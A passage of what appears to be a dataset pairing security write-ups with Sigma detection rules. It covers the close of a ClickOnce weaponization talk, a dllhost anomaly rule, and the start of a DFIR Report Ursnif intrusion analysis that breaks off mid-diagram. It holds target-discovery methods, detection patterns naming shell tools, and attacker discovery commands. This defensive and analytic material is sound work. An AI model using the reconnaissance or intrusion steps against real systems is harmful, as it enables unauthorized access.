src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FCpuXgqvnNow%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DCpuXgqvnNow&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FCpuXgqvnNow%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO3\" width=\"854\"></iframe>\n\n---\n\n## Identification of .NET Assemblies and ClickOnce Applications\n\nSo far, we’ve covered the types of applications that can be weaponized, and now we want to discover potential targets. We have released two tools that will aid in the discovery of existing ClickOnce applications and .NET assemblies that can be weaponized for ClickOnce.\n\n> ClickonceHunter\n\n- searches online for existing ClickOnce published code\n- Google dorks, Github and others\n\n> AssemblyHunter\n\n- Searches file paths or files and looks for given criteria (signed, identity info, arch, UAC, etc.)\n- Helps identify target applications to weaponize\n\nClickonceHunter will automate what can be done manually with Google or other related searches.\n\n```image\nAlt: Dorking to Discover Third-Party ClickOnce Deployments\nDescription: The image displays a Bing search results page featuring a query for 'ClickOnce and .NET Framework Resources' with a specified file type of .h. The results include several links to different applications and resources related to ClickOnce, such as 'SPC Connect Pro', 'e-Form RS', 'Geriatric Notes Tool - DeerOaks', and 'MicroMaidCloud'. Each result contains a brief description of the resource, indicating the context and functionality of the applications listed.\nTranscription: |\n  inbody:\"ClickOnce and .NET Framework Resources\" AND filetype:html\n  \n  11-24 Of 11,100 Results\n  \n  1. SPC Connect Pro\n     https://www.spconnectpro.com/install\n     Microsoft .NET Framework 4.6.2 (x86 and x64) SPC Connect Pro License Agreement. If these components are already installed, you can launch the application now. Otherwise, click the button…\n  \n  2. e-Form RS\n     https://eformrs.com/eform\n     If the install doesn't start when you click the button, click on the \"Setup.exe\" program in the Downloads list and select Run. ClickOnce and .Net Framework Resources.\n  \n  3. Geriatric Notes Tool - DeerOaks\n     https://gntweb.deeroaks.com/GNT\n     Cragg Consulting Customer Support :: ClickOnce and .NET Framework Resources …\n  \n  4. MicroMaidCloud\n     https://mmcds.micromaidcloud.com/MicroMaidCloud.html\n     The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64) If these components are already installed, you can launch the application now…\n```\n\n```image\nAlt: Github Searches for ClickOnce Projects (maybe with signed releases?)\nDescription: The image displays a screenshot of a GitHub search result for the term 'clickonce:manifest.' It shows a total of 60,209 code results, with relevant statistics such as the number of repositories, code files, commits, and issues. The top match is highlighted, showing XML code for a ClickOnce application manifest file, indicating details about the assembly and identity of the application. The interface is dark-themed, typical of GitHub's design, and provides a structured view of search results and metadata.\nTranscription: |\n  60,209 code results\n  \n  Repositories      236\n  Code              60K\n  Commits           5K\n  Issues            4K\n  Discussions       30\n  Packages          2\n  Marketplace       0\n  Topics            5\n  Wikis             197\n  Users             9\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_4/ClickOnce.dll.manifest\n  <assembly:assembly xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:adaptive=\"http://schemas.microsoft.com/windows/2007/08/xaml\" \n      manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" \n      xmlns:urn=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:co=\"urn:schemas-microsoft-com:ClickOnce.v1\" \n      xmlns:asm3=\"urn:schemas-microsoft-com:asm.v3\" \n      xmlns:disg=\"http://www.w3.org/2008/09/xmlsig#\" \n      xmlns:co.v2=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <assemblyIdentity name=\"Click Once.exe\" version=\"1.0.0.5\" \n          publicKeyToken=\"00000000000000000000\" language=\"neutral\" \n          processorArchitecture=\"x86\" type=\"win32\"/>\n  </assembly>\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_2/ClickOnce.dll.manifest\n```\n\nWhile ClickonceHunter will go look through the internet for existing applications, AssemblyHunter will recursively search local file systems for assemblies that meet the criteria for a regular .NET assembly to be deployed as a ClickOnce application.\n\n```image\nAlt: Usage for AssemblyHunter\nDescription: The image depicts a command line interface output for the tool 'AssemblyHunter.exe'. It lists various run type options and their corresponding examples, showing users how to utilize the tool to search for .NET assemblies and related information. Key options include searching paths, files, services, and autoruns, along with optional arguments that allow for more specific queries regarding assembly characteristics and configurations.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe help\n  \n  AssemblyHunter.exe\n  \n  Run Type Options:\n    path        (ex: path=C:\\Users)              full path to search\n    file        (ex: file=C:\\file.exe)           check if a specific file is an assembly\n    collection  (ex: file=C:\\files.txt)          run checks against assemblies listed in a file\n    services    (ex: services=services)          enumerates all services for assemblies\n    tasks       (ex: tasks=tasks)                enumerates all scheduled tasks for assemblies\n    autoruns    (ex: autoruns=autoruns)          enumerates common autorun locations for assemblies\n  \n  Optional args:\n    recurse      (ex: recurse=true)              recurse the path given\n    allPaths     (ex: allPaths=true)             recurses all directories, by default some directories with common Microsoft assemblies are skipped\n    exeonly      (ex: exeonly=true)              look for exes only\n    getarch      (ex: getarch=true)              get assembly architecture\n    servicename  (ex: servicename=true)          check if an exe is a service executable\n    isservice    (ex: isservice=true)            check a specific service (needs services run)\n    getuac      (ex: getuac=true)                gets UAC settings of assembly\n    getrefs      (ex: getrefs=true)              gets references for target assembly\n    getsid       (ex: getsid=true)               gets internal assembly manifest identity\n    getsmid      (ex: getsmid=true)              gets internal application manifest identity\n    getappmanifest (ex: getappmanifest=true)     gets internal application manifest\n    getasmmanifest (ex: getasmmanifest=true)     gets internal assembly manifest\n  \n  * path, file, collection, services, tasks, or autoruns should indicate the type of search performed, all other options narrow down the search\n```\n\n```image\nAlt: AssemblyHunter Discovering .NET Assembly\nDescription: The image displays a command line output from a tool called AssemblyHunter, which is used to identify .NET assemblies in a specific directory. The output lists several found assemblies along with their details, including the assembly manifest identity, version, culture, public key token, and UAC (User Account Control) settings. The highlighted portion indicates that some assemblies lack an application manifest identity, which is crucial for ClickOnce deployment. This content provides valuable technical information relevant to the identification and potential weaponization of .NET applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exonly=true getsid=true getapid=true getauc=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nUsing AssemblyHunter, we can quickly identify assemblies across a host’s filesystem and look for values that will be useful to us.\n\n```image\nAlt: AssemblyHunter Showing Assemblies that can be Weaponized\nDescription: The image displays a terminal output from running the AssemblyHunter tool, which is used to discover .NET assemblies. The output shows several found assemblies along with their details including paths, certificate issuer names, UAC settings, and assembly manifest identities. Notably, it highlights instances where there is no application manifest identity. This output provides technical information relevant to the identification and potential weaponization of ClickOnce applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exenoly=true getsid=true getapid=true getuac=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nAssemblyHunter will also show us assemblies that are not useful to us if we would like to see them.\n\n```image\nAlt: Example of anAssembly that Cannot be Weaponized\nDescription: The image displays a terminal or command prompt output that provides detailed information about a found .NET assembly located at 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe'. It includes various attributes such as the certificate issuer name, subject name, UAC setting, assembly manifest identity, and application manifest identity. Key details highlighted in red help identify the assembly's attributes relevant for potential weaponization.\nTranscription: |\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] UAC setting: asInvoker\n  [+] Assembly Manifest Identity: caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=AMD64\n  [+] Application Manifest Identity: 1.0.0.0, MyApplication.app\n```\n\n---\n\n## Detection and Prevention Opportunities\n\nA major benefit to defenders who want to identify malicious ClickOnce deployments is that ClickOnce is not commonly used in many corporate environments. Defenders can baseline their environments to look for how prevalent they are and make detection or prevention decisions. Things we would consider looking for when identifying or preventing malicious ClickOnce use is:\n\n> **Monitoring dfsvc.exe process activity**\n\n- Monitoring child process activity (e.g. child processes with unsigned module loads)\n- Baseline required ClickOnce activity to whitelist applications with valid business use-cases\n- Monitoring activity associated with *dfshim.dll* (can also be used for launching ClickOnce deployments)\n\n> Evaluate ETW telemetry associated with ClickOnce deployment execution\n\n- Keep in mind ETW bypasses or *\\<etwEnable\\>* .NET config value\n\n> Baseline the default ClickOnce installation directories\n\n- *%LOCALAPPDATA%\\Apps\\2.0\\<string>*\n\n> Baseline of application that have never been seen making connections to the internet\n\n> Disable all ClickOnce installations from the internet, while still allowing from other trust zones\n\n- Options include: Enabled, AuthenticodeRequired, and Disabled\n- Zones include: MyComputer, LocalIntranet, TrustedSites, Internet, UntrustedSites\n- To disable installation from internet: *\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled*\n\n> If an Application Control solution is deployed\n\n- Prevent unreputable DLLs from being loaded\n\nIf ClickOnce application execution from the internet is disabled using the registry key(s) mentioned above, a user will receive a prompt that does not give them the option to run the application.\n\n```image\nAlt: Prevention of ClickOnce Installation from Internet Trust Zone\nDescription: The image is a screenshot of a security warning dialog box on a computer. It indicates that an application installation has been blocked by the administrator due to potential security risks. The dialog provides the following details: the application name is 'Defcon30 Demo, Inc.', the source URL is 'defcon30.azureedge.net', and the publisher is listed as 'Unknown Publisher'. Additionally, there is a note stating that security settings on the computer prevent the application from being installed.\nTranscription: |\n  Application Install - Security Warning\n  \n  Your administrator has blocked this application because it potentially poses a security risk to your computer.\n  \n  Name:\n  Defcon30 Demo, Inc.\n  \n  From (Hover over the string below to see the full domain):\n  defcon30.azureedge.net\n  \n  Publisher:\n  Unknown Publisher\n  \n  [Close]\n  \n  Your security settings do not allow this application to be installed on your computer.\n```\n\n---\n\n## Closing\n\nBased on all that was covered, we see ClickOnce as one of the best opportunities for initial access. There are still plenty of areas to dig into and additional potential for offensive use-cases.",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of ClickOnce Application",
      "id": "67bc0e75-c0a9-4cfc-8754-84a505b63c04",
      "status": "test",
      "description": "Detects potentially suspicious child processes of a ClickOnce deployment application",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "tags": [
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|contains": "\\AppData\\Local\\Apps\\2.0\\",
          "Image|endswith": [
            "\\calc.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dfsvc_suspicious_child_processes.yml",
    "id": "136"
  },
  {
    "url": "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Dllhost.EXE Execution Anomaly",
      "id": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
      "status": "test",
      "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08",
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-27",
      "modified": "2023-05-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dllhost.exe",
          "CommandLine": [
            "dllhost.exe",
            "dllhost"
          ]
        },
        "filter_main_null": {
          "CommandLine": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dllhost_no_cli_execution.yml",
    "id": "146"
  },
  {
    "url": "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
    "markdown": "# Unwrapping Ursnifs Gifts\n\n**Categories:**\ncobaltstrike\nExfiltrate Data\nursnif\nwmiexec\n\n**Published on:**\nJanuary 9, 2023\n\nIn late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed. This was followed by the threat actors moving laterally throughout the environment using an admin account.\n\nThe Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today. It has an extensive past of code forks and evolutions that has led to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3, and most recently, LDR4.\n\nFor this report, we have referred to the malware as Ursnif for simplicity, however, we also recommend reading Mandiant’s article on LDR4.\n\n## The DFIR Report Services\n\n- **Private Threat Briefs:** Over 20 private reports annually, such as this one but more concise and quickly published post-intrusion.\n- **Threat Feed:** Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.\n- **All Intel:** Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.\n- **Private Sigma Ruleset:** Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.\n- **DFIR Labs:** Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.\n\nContact us today for a demo!\n\n## Case Summary\n\nIn this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware. The malware displayed an interesting execution flow, which included using a renamed copy of rundll32. Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID. The malware also established persistence on the host with the creation of a registry run key.\n\nApproximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard). The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions.\n\nThe threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping. Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.\n\nUsing the credentials extracted from memory, the threat actors began to move laterally. They targeted a domain controller and used Impacket’s wmiexec.py to execute code on the remote host. This included executing both an MSI installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon. These files were transferred to the domain controller over SMB.\n\nAfter connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller. Finally, they dropped a script named `adcomp.bat` which executed a PowerShell command to collect data on computers in the Windows domain.\n\nThe following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day. At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller. From there, the threat actor began connecting to various hosts across the network.\n\nOne host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session. The threat actor was later evicted from the network.\n\n## Timeline\n\n```image\nAlt: Unwrapping Ursnifs Gifts Timeline\nDescription: The image is a detailed timeline diagram titled \"Unwrapping Ursnifs Gifts\" that depicts a chronological sequence of events related to a cyber threat intelligence case involving the Ursnif malware. It outlines various activities occurring over six days, including initial access, credential discovery, command and control activities, and other actions taken by the attackers. Each entry provides specific timestamps (UTC), commands executed, and the context of actions like process injections, lateral movements, and credential harvesting, making it a valuable resource for understanding the attack's progression.\nTranscription: |\n  Unwrapping Ursnifs Gifts\n  \n  Day 1\n  - 11:33 UTC Initial Access\n    - HPG\\Mounted\\C:\\Users\\REDACHTED\\Downloads\\1884849\n  - 11:34 UTC Ursnif Discovery\n    - cmd /c \"net user\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\user.txt\n    - cmd /c \"query process\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\process.txt\n    - cmd /c \"whoami\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\whoami.txt\n  - 11:39 UTC Process Injection and Command and Control\n    - Injected Process explorer.exe\n    - Explorer.exe\n    - [IP: 93.90.19.186]\n  - 11:41 UTC Command and Control and Persistence\n    - Registry Run Key\n    - HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{random string}\n    - [IP: 209.85.175.206]\n  \n  Day 4\n  - 09:04 UTC Discovery\n    - lhturn\n    - lhturn.exe\n  - 09:08 UTC Cobalt Strike Discovery\n    - cmd.exe /K user <REDACHTED>\n    - C:\\Windows\\system32\\cmd.exe /c net\n    - C:\\Windows\\system32\\cmd.exe /c powershell\n  - 09:18 UTC Credential Access on Beachhead\n    - Process Create: ApplicationFrameHost.exe\n    - [gathering source: 411]\n    - C:\\Windows\\system32\\cmd.exe /c whoami\n  - 09:24 UTC Command and Control and Persistence\n    - Alerts are forwarding enabled\n    - C:\\Windows\\system32\\spool\\drivers\\w32x86\\{random string}.exe\n    - process.exe access failed\n  - 10:38 UTC DC Discovery and Credential Access\n    - C:\\Windows\\system32\\cmd.exe /c page -domain:domain\n    - C:\\Windows\\system32\\{random string}.exe\n  \n  Day 5\n  - 09:04 UTC Discovery\n    - lhturn\n    - lhturn.exe\n  - 09:08 UTC Cobalt Strike Discovery\n    - cmd.exe /K user <REDACHTED>\n    - C:\\Windows\\system32\\cmd.exe /c net\n    - C:\\Windows\\system32\\cmd.exe /c powershell\n  - 09:21 UTC Lateral Movement to Domain Controller\n    - [ip: 192.168.1.1]\n    - C:\\Windows\\system32\\spool\\drivers\\w32x86\\{random string}.exe\n  - 09:27 UTC Lateral Movement and Command and Control\n    - Cobalt Strike executable transferred via SMB\n    - C:\\ProgramData\\{random string}\n    - [IP: 93.90.19.186]\n  \n  Day 6\n  - 10:32 UTC Discovery on Beachhead\n    - C:\\ProgramData\\{random string}\n  - 23:39 Discovery from Domain Controller\n    - Cobalt Strike EDR Proxy\n    - C:\\ProgramData\\{random string}\n    - Local host IP: 192.168.1.1 | Local host IP: 3399\n    - Domain Controller IP: Various hosts 1399\n    - C:\\Windows\\system32\\{random string}.exe\n  - 00:04 UTC Lateral Movement to Backup Server\n    - EDR logs from Domain Controller\n    - C:\\Windows\\system32\\{random string}.exe\n    - C:\\Windows\\system32\\{random string}.exe\n```\n\n## Initial Access\n\nIn this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file.\n\nThe DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious files using ISO files:\n\n- Quantum Ransomware\n- BumbleBee Roasts Its Way to Domain Admin\n- BumbleBee: Round Two\n- Diavol Ransomware\n\nAs we have previously highlighted, the Event Log `Microsoft-Windows-VHDMP-Operational.evtx` contains high confidence evidence when users mount ISO files. We recommend looking for these events (especially Event ID’s 1, 12 & 25) in your environment and checking for anomalies.\n\nIn this case, the user had saved the file `3488164.iso` to their downloads folder and mounted it.\n\n```image\nAlt: ISO File Mount\nDescription: The image displays a screenshot of Windows Event Viewer, specifically showing the operational log for 'Microsoft-Windows-VHDMP-Operational'. It lists several events related to the mounting of a Virtual Hard Disk (VHD), indicating that the ISO file '3488164.iso' was mounted. The screenshot includes details such as event levels, dates and times, event IDs (notably Event ID 1), and task categories, which are relevant for identifying suspicious activity related to malware delivery.\nTranscription: |\n  Microsoft-Windows-VHDMP-Operational\n  Number of events: 13\n  \n  | Level       | Date and Time | Source | Event ID | Task Category              |\n  | ----------- | ------------- | ------ | -------- | -------------------------- |\n  | Information |               | VHDMP  | 14       | Virtual Disk Handle Close  |\n  | Information |               | VHDMP  | 30       | Virtual Disk Handle Close  |\n  | Information |               | VHDMP  | 1        | Surface Virtual Disk       |\n  | Information |               | VHDMP  | 25       | Surface Virtual Disk       |\n  | Information |               | VHDMP  | 12       | Virtual Disk Handle Create |\n  | Information |               | VHDMP  | 22       | Filewrapper Handle Create  |\n  | Information |               | VHDMP  | 23       | Filewrapper Handle Create  |\n  \n  Event 1, VHDMP\n  \n  General\n  Details\n  The VHD C:\\Users\\<redacted>\\Downloads\\3488164.iso has come online (surfaced) as disk number 0.\n```\n\nOnce mounted, the new drive contained a LNK file `6570872.lnk` and hidden folder “me”.\n\n```image\nAlt: LNK File\nDescription: The image shows the properties of a Windows shortcut file named '6570872.lnk' located in a mounted ISO file under the folder 'me'. It displays details such as the target type (Windows Batch File), target location pointing to 'me\\alsoOne.bat', and additional metadata like 'Date modified' and 'Type'. This context indicates the potential malicious use of the shortcut file to execute a batch script associated with the Ursnif malware.\nTranscription: |\n  | Name    | Type        | Size | Date modified |\n  | ------- | ----------- | ---- | ------------- |\n  | me      | File folder | -    | -             |\n  | 6570872 | Shortcut    | 2 KB | -             |\n  \n  **Shortcut Properties:**\n  - **Target type:** Windows Batch File\n  - **Target location:** me\n  - **Target:** E:\\me\\alsoOne.bat\n  - **Start in:**\n  - **Shortcut key:** None\n```\n\nIf we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as:\n\n```image\nAlt: LECmd Output\nDescription: The image displays a terminal output from a forensic analysis tool, showing details about a LNK file named '6570872.lnk'. It includes metadata such as source creation, modification times, and the relative path to a batch file 'alsoOne.bat'. The header section lists various flags indicating the file's properties and attributes. This output is significant for understanding how the LNK file operates in the context of the Ursnif malware execution process.\nTranscription: |\n  Source file: \\6570872.lnk\n  Source created: 09:29:59\n  Source modified: 12:45:46\n  Source accessed: 01:26:41\n  \n  --- Header ---\n  Target created: null\n  Target modified: null\n  Target accessed: null\n  \n  File size: 0\n  Flags: HasTargetIdList, HasRelativePath, HasIconLocation, IsUnicode, HasExpIcon\n  File attributes: 0\n  Icon index: 0\n  Show window: SwShowmininactive (Display the window as minimized without activating it.)\n  \n  Relative Path: ..\\..\\..\\me\\alsoOne.bat\n  Icon Location: c:\\windows\\explorer.exe\n```\n\nThe contents of hidden folder “me”, included several files and folders that were used for the execution of Ursnif. Of interest, the folder included a legitimate copy of `rundll32.exe` (renamed to `123.com`).\n\n```image\nAlt: Hidden Folder Contents\nDescription: The image displays the contents of a directory labeled 'me' on a DVD drive, showcasing various files and folders associated with the Ursnif malware. The directory includes two empty folders ('by' and 'here'), a renamed executable ('123.com'), a Windows batch file ('alsoOne.bat'), a JavaScript file ('canWell.js'), a database file ('itslt.db'), and a JPEG image ('or.jpg'). The file types and sizes are listed, indicating the purpose and potential functionality of these files in relation to the malware execution.\nTranscription: |\n  DVD Drive (E:) CD_ROM \\ me \\\n  ---------------------------------------------------------------\n  | Name        | Date modified | Type                  | Size   |\n  | ----------- | ------------- | --------------------- | ------ |\n  | by          | 2022          | File folder           |        |\n  | here        | 2022          | File folder           |        |\n  | 123.com     | 2022          | MS-DOS Application... | 61 KB  |\n  | alsoOne.bat | 2022          | Windows Batch File    | 1 KB   |\n  | canWell.js  | 2022          | JavaScript File       | 1 KB   |\n  | itslt.db    | 2022          | Data Base File        | 351 KB |\n  | or.jpg      | 2022          | JPEG image            | 78 KB  |\n  ---------------------------------------------------------------\n```\n\nSummary of the files found in `3488164.iso` (a detailed breakdown of these can be found in **Execution**):\n\n| File Name      | Purpose                                                     |\n| -------------- | ----------------------------------------------------------- |\n| 6570872.lnk    | LNK file that executes alsoOne.bat                          |\n| me/by          | Empty folder                                                |\n| me/here        | Empty folder                                                |\n| me/123.com     | Renamed legitimate version of rundll32.exe                  |\n| me/alsoOne.bat | Batch script to run canWell.js with arguments               |\n| me/canWell.js  | Reverses argument strings and executes tslt.db with 123.com |\n| me/itslt.db    | Ursnif DLL                                                  |\n| or.jpg         | Image not used                                              |\n\n## Execution\n\nOnce the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.\n\n```image\nAlt: Execution Flow\nDescription: The image depicts a detailed execution flow related to the Ursnif malware. It outlines the sequence of processes initiated after a user mounts an ISO file and executes a LNK file. The flowchart illustrates various components, including 'Explorer.exe,' 'mshta.exe,' and 'powershell.exe,' along with their interactions and the execution of scripts and commands. Key actions include file creation, persistence mechanisms, and discovery commands executed via the command line. The diagram is structured with arrows indicating the flow of execution and includes annotations for clarity.\nTranscription: |\n  